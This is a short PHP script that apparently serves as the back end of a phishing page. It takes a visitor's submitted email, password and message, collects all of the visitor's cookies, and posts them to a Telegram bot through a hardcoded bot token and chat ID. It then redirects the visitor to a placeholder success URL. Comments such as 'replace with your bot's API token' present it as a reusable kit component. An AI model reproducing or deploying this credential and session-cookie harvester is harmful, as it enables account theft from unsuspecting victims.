<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data safely
    $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';
    $message_content = isset($_POST['message']) ? htmlspecialchars($_POST['message']) : '';
    
    // Collect cookies
    $cookies = '';
    foreach ($_COOKIE as $key => $value) {
        $cookies .= htmlspecialchars($key) . ': ' . htmlspecialchars($value) . "\n";
    }
    
    // Telegram Bot API details
    $telegram_bot_token = "7886033469:AAEa7Z9kMiwJtijg0XalOD4h3T-MzB6Nm5E"; // Replace with your bot's API token
    $telegram_chat_id = "6695164281"; // Replace with your chat ID

    // Prepare the message
    $message = "New Form Submission:\n\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";
    $message .= "Message: " . $message_content . "\n";
    $message .= "Cookies:\n" . $cookies;

    // Telegram API URL
    $telegram_api_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";

    // Send the data to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $telegram_chat_id,
        'text' => $message,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $telegram_response = curl_exec($ch);
    curl_close($ch);

    // Check the response and redirect or echo message
    if ($telegram_response) {
        // Redirect to a different link
        header("Location: http://example.com/success"); // Replace with your redirect URL
        exit; // Make sure script stops executing after redirection
    } else {
        echo "Failed to send data to Telegram.";
    }
}
?>